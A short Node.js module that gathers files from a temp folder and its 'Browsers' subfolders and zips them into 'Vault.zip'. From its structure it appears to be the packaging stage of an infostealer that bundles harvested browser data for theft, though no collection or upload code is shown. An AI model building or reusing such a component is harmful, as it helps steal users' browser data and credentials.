const { join, sep } = require('path');
const fs = require('fs');
const { generateZipFromFiles } = require('../util/zip');
const { getTempFolder } = require('../util/init');

const paths = [getTempFolder(), join(getTempFolder(), 'Browsers')];
fs.readdirSync(join(getTempFolder(), 'Browsers')).forEach((folder) => paths.push(join(getTempFolder(), 'Browsers', folder)));

const filter = file => file.split('.').length > 1 && !file.endsWith('.exe');
const files = fs.readdirSync(getTempFolder()).filter(filter);
paths.forEach(path => {
  fs.readdirSync(path).filter(filter).forEach(file => {
    files.push(join(path.split(getTempFolder().split(sep).pop())[1].replace(sep, ''), file));
  });
});

module.exports = generateZipFromFiles(paths, files, join(getTempFolder(), 'Vault.zip'));
